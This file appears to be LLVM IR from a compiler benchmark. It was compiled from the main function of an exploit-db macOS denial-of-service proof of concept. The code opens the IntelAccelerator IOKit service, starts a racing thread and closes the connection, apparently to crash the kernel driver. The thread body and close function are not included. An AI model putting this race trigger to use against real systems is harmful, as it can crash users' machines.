; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_39367.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_39367.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [17 x i8] c"IntelAccelerator\00", align 1
@kIOMasterPortDefault = common dso_local global i32 0, align 4
@MACH_PORT_NULL = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [20 x i8] c"can't find service\0A\00", align 1
@conn = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [26 x i8] c"can't connect to service\0A\00", align 1
@go = common dso_local global i64 0, align 8
@start = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i64 0, i64 0), i8** %6, align 8
  store i32 4, i32* %7, align 4
  %11 = load i32, i32* @kIOMasterPortDefault, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = call i32 @IOServiceMatching(i8* %12)
  %14 = call i64 @IOServiceGetMatchingService(i32 %11, i32 %13)
  store i64 %14, i64* %8, align 8
  %15 = load i64, i64* %8, align 8
  %16 = load i64, i64* @MACH_PORT_NULL, align 8
  %17 = icmp eq i64 %15, %16
  br i1 %17, label %18, label %20

18:                                               ; preds = %2
  %19 = call i32 @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %41

20:                                               ; preds = %2
  %21 = load i64, i64* %8, align 8
  %22 = call i32 (...) @mach_task_self()
  %23 = load i32, i32* %7, align 4
  %24 = call i32 @IOServiceOpen(i64 %21, i32 %22, i32 %23, i64* @conn)
  %25 = load i64, i64* @conn, align 8
  %26 = load i64, i64* @MACH_PORT_NULL, align 8
  %27 = icmp eq i64 %25, %26
  br i1 %27, label %28, label %30

28:                                               ; preds = %20
  %29 = call i32 @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %41

30:                                               ; preds = %20
  %31 = load i64, i64* @conn, align 8
  store i64 %31, i64* %10, align 8
  %32 = load i64, i64* @go, align 8
  %33 = inttoptr i64 %32 to i8*
  %34 = bitcast i64* %10 to i8*
  %35 = call i32 @pthread_create(i32* %9, i32* null, i8* %33, i8* %34)
  %36 = call i32 @usleep(i32 100000)
  store i32 1, i32* @start, align 4
  %37 = load i64, i64* @conn, align 8
  %38 = call i32 @close_it(i64 %37)
  %39 = load i32, i32* %9, align 4
  %40 = call i32 @pthread_join(i32 %39, i32* null)
  store i32 0, i32* %3, align 4
  br label %41

41:                                               ; preds = %30, %28, %18
  %42 = load i32, i32* %3, align 4
  ret i32 %42
}

declare dso_local i64 @IOServiceGetMatchingService(i32, i32) #1

declare dso_local i32 @IOServiceMatching(i8*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @IOServiceOpen(i64, i32, i32, i64*) #1

declare dso_local i32 @mach_task_self(...) #1

declare !callback !2 dso_local i32 @pthread_create(i32*, i32*, i8*, i8*) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @close_it(i64) #1

declare dso_local i32 @pthread_join(i32, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
